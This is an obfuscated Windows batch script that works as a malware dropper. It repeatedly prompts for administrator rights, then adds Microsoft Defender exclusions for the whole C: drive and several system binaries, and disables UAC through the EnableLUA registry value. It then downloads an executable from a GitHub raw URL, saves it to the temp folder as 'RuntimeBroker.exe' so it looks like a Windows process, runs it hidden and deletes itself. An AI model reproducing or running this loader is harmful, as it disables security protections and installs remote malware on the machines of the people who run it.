@echo off & setlocal enableDelayedExpansion
set "qkX=NET" & set "IwImb=>nul" & set "iyZj=SESSION" & set "wwt=2>&1"
%qkX% %iyZj% %IwImb% %wwt%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "fDF=foo" & set "vww=qux" & set "xpkce=bar" & set "WTO=baz" & rem flJjr cUl AqBuLO
set "ZPA=powershell -ExecutionPolicy Bypass -Command"
set "QOPLS=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "TYZ='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "ighYn='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!ZPA! "!QOPLS! !TYZ! !ighYn!" %IwImb% %wwt%
set "qNEZ=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "nLaZW=-Name 'EnableLUA' -Value 0"
!ZPA! "!qNEZ! !nLaZW!" %IwImb% %wwt%
set "VDLo=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!ZPA! "!VDLo!" %IwImb% %wwt%
if !errorlevel! neq 0 (goto %a%)
set "ApmvR=timeout /t" & !ApmvR! 2 %IwImb% %wwt%
set "UeSr=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "VDJ=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "hRDeS=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!ZPA! "!UeSr! !VDJ! !hRDeS!" %IwImb% %wwt%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!ApmvR! 1 %IwImb% %wwt% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %IwImb% %wwt%
del /f /q "%~f0" %IwImb% %wwt%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %IwImb% %wwt%
if !errorlevel! neq 0 (!ApmvR! 3 %IwImb% %wwt% & goto %b%)
exit /b
